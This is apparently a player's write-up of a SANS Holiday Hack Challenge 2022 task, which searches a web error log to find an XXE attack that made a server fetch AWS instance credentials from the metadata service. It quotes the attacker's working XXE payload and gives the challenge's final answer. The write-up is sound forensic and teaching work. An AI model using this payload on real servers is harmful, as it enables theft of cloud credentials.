# Recover the Web Ring: IMDS, XXE, and Other Abbreviations  
**SANS Holiday Hack Challenge 2022 – KringleCon V: Golden Rings**  
**Difficulty:** 🎄🎄

## Overview  
This challenge demonstrates a server-side request forgery (SSRF) scenario via an XML External Entity (XXE) vulnerability. The objective was to identify the exact URL the attacker forced the web server to fetch from the AWS Instance Metadata Service (IMDS).

---

## Steps Performed

### 1. Use the `weberror.log` File  
The challenge could be solved using either a packet capture or the `weberror.log` file. I chose the latter and searched for XML content indicating XXE injection.

---

### 2. Search for `access` Keyword  
Using the known keyword `"access"`, I searched for log entries that included references to AWS access credentials and XML content:

```bash
grep -m 1 -A 24 -B 13 -i "access" weberror.log
```

This revealed an XML payload in the request:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY id SYSTEM "http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance"> ]>
<product>
  <productId>&id;</productId>
</product>
```

---

### 3. Identify the Targeted URL  
From the XML entity declaration, it’s clear that the attacker exploited the XXE vulnerability to exfiltrate sensitive credentials by referencing this IMDS path:

```
http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance
```

---

## Outcome  
By leveraging an XXE attack, the adversary accessed AWS instance credentials via the metadata endpoint.

**Final Answer:**  
```
http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance
```
